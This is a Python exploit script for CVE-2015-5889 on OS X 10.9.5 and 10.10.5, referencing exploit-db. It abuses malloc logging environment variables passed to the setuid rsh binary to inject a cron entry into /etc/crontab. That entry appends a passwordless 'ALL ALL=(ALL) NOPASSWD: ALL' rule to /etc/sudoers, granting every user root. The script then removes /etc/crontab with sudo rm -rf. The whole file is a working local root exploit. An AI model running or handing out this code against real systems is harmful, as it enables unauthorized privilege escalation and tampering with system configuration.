# CVE-2015-5889
# References:
# http://www.cvedetails.com/cve/cve-2015-5889
# https://www.exploit-db.com/exploits/38371/
# Tested on OS X 10.9.5 / 10.10.5
import os
import time


def get_root():
    env = {}
    old_size = os.stat("/etc/sudoers").st_size

    env['MallocLogFile'] = '/etc/crontab'
    env['MallocStackLogging'] = 'yes'
    env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'

    print "Creating /etc/crontab..."

    p = os.fork()
    if p == 0:
        os.close(1)
        os.close(2)
        os.execve("/usr/bin/rsh", ["rsh", "localhost"], env)

    time.sleep(1)

    if "NOPASSWD" not in open("/etc/crontab").read():
        print "FAILED!"
        exit(-1)

    print "Done, waiting for /etc/sudoers to update..."

    while os.stat("/etc/sudoers").st_size == old_size:
        time.sleep(1)

    print "Exploit completed."
    os.system("sudo rm -rf /etc/crontab")
    exit()


if __name__ == '__main__':
    get_root()
